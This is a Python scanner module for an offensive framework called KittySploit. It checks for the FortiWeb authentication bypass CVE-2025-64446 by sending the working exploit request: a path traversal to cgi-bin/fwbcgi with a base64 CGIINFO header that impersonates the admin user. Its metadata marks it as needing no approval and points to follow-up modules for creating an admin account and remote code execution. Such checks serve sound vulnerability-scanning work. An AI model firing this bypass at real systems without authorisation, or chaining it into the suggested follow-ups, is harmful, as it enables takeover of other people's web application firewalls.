#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FortiWeb unauthenticated auth bypass via path traversal (CVE-2025-64446)."""

import base64
import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fortinet FortiWeb - Authentication Bypass Detection (CVE-2025-64446)',
        'description': (
            'CVE-2025-64446: relative path traversal on /api/v2.0/cmdb/system/admin allows '
            'unauthenticated attackers to reach cgi-bin/fwbcgi and invoke administrative APIs.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'fortinet', 'fortiweb', 'auth-bypass', 'kev', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.35,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/fortinet_fortiweb_cve_2025_64446_admin_create',
                    'exploits/linux/http/fortinet_fortiweb_rce',
                ],
            },
        },
        'references': [
            'https://www.fortiguard.com/psirt/FG-IR-25-910',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-64446',
        ],
        'cve': 'CVE-2025-64446',
    }

    base_path = OptString('/', 'URI prefix before /api/v2.0', required=False)

    def _probe_path(self) -> str:
        prefix = str(self.base_path or '/').rstrip('/')
        return f'{prefix}/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi'

    def _cgiinfo(self) -> str:
        payload = {
            'username': 'admin',
            'profname': 'prof_admin',
            'vdom': 'root',
            'loginname': 'admin',
        }
        return base64.b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode()

    def run(self):
        path = self._probe_path()
        headers = {
            'CGIINFO': self._cgiinfo(),
            'Content-Type': 'application/json',
        }
        r = self.http_request(
            method='POST',
            path=path,
            headers=headers,
            data=json.dumps({'data': {}}),
            allow_redirects=False,
        )
        if not r or r.status_code == 403:
            return False
        if r.status_code != 200:
            return False
        try:
            body = r.json()
            msg = body.get('results', {}).get('message', '')
            if msg == "Empty value isn't allowed.":
                self.set_info(
                    severity='critical',
                    reason='FortiWeb CVE-2025-64446 auth bypass endpoint reachable',
                    path=path,
                )
                return True
        except (json.JSONDecodeError, TypeError, AttributeError):
            pass
        text = r.text or ''
        if 'results' in text and 'message' in text:
            self.set_info(
                severity='critical',
                reason='FortiWeb fwbcgi traversal response (possible CVE-2025-64446)',
                path=path,
            )
            return True
        return False
